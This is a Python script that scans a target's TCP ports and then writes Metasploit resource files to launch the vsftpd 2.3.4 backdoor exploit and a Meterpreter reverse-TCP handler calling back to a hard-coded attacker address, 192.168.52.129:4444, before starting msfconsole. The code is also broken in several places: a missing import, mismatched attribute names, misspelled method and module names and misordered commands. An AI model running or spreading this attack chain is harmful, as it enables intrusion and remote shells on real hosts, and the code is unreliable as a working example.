import pyfiglet
from optparse import OptionParser
from socket import *
from threading import *

class Scanner:
    def __init__(self):
        self.ascii_banner = pyfiglet.figlet_format("Scanner")
        print(self.ascii_banner)
        # popular port maybe turn it into a dictionary
        self.popular_ports_list = ['554' , '3306', '179', '1080', '161', '162', '445', '5432', '9092', '6379', '80', '443', '22', '21', '8080', '23', '25' ,'53', '587', '993', '995', '8443', '465', '1080']
        # lock that prevents other threads from proceeding
        self.screenlock = Semaphore(value=1)
        # create an instance of the port scanner
        self.result_display = False
        self.opened_ports_list = []

    def add(self, port):
        self.opened_ports_list.append(port)

    # attempts to target the host in that specific port
    def tcpScan(self, target, port):
        try:
            # create socket -- connect to host and port -- send a message -- get reply
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((target,port))
            s.send(bytes("message\r\n", "utf-8"))
            result = s.recv(1024)
            self.screenlock.acquire()
            self.add(port)
            print("[-] " + str(port) + "/tcp Opened")

            if self.result_display:
                print("[#] Result: " + str(result))


        except:
            self.screenlock.acquire()
            print("[-] " + str(port) + "/tcp Closed")

        finally:
            self.screenlock.release()
            s.close()


    # enemurate each port and attempts to connect to each port
    def portScan(self, target, ports):

        print("[+] Scanning for target: " + target)
        setdefaulttimeout(1)
        for port in ports:
            t1 = Thread(target=self.tcpScan, args=(target, int(port)))
            t2 = Thread(target=self.ftpcheck, args=(target,))
            threads = [t1, t2]
            for t in threads:
                t.start()
                t.join()

        os.system('msfconsole -r meta.rc')


    def ftpcheck(self, target):
        lhost = '192.168.52.129'
        lport = '4444'
        rhost = target
        rport = 0
        if 21 in self.opened_ports_list:
            rport = 21

        self.ftpExploit(rhost, lhost, lport)




    # write instructions to out metasploiy resource configuration file
    def setupHandler(self, lhost, lport):
        self.configFile = open('meta.rc', 'w')
        self.configfile.write('use exploit/multi/hanlder\n')
        self.configfile.write('use PAYLOAD windows/meterpreter/reverse_tcp\n')
        self.configfile.write(f'set LPORT {lport}\n')
        self.configfile.write(f'set LHOST {lhost}\n')
        self.configfile.write('exploit')
        self.configfile.write('setg DisablePayloadHandler 1\n')

    # listener to the exploited target with port 80 opened
    def ftpExploit(self, rhost, lhost, lport):
        self.configFile = open('meta.rc', 'w')
        self.configfile.write('use exploit/unix/ftp/vsftpd_234_backdoor\n')
        self.configfile.write(f'set RHOST {rhost}\n')
        self.configfile.wrire('exploit')



# where it will get parsed
def main():
    scanner = Scanner()
    parser = OptionParser('usage %prog -h <target host>')
    # adding options
    # option: target ipv4
    parser.add_option('-t', dest='tgtHost', type='string', help='specify target host')
    # option: target port if not given run agaisnt popular ports
    parser.add_option('-p', dest='tgtPort', type='string', help='specify target port')
    # parser.add_option('-d', dest='result_display', type='bool', help=' port reply result enabled')

    (options, args) = parser.parse_args()

    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split(",")
    # result_display = bool(options.result_display)

    if (tgtHost == None):
        print(parser.usage)
        exit(0)

    # if (result_display == None):
        scanner.result_display = False
    # else:
        scanner.result_display = True


    if tgtPorts[0] == 'None':
        print("[!] Popular Ports will be used")
        tgtPorts = scanner.popular_ports_list

    scanner.portScan(tgtHost, tgtPorts)




if __name__ == '__main__':
    main()
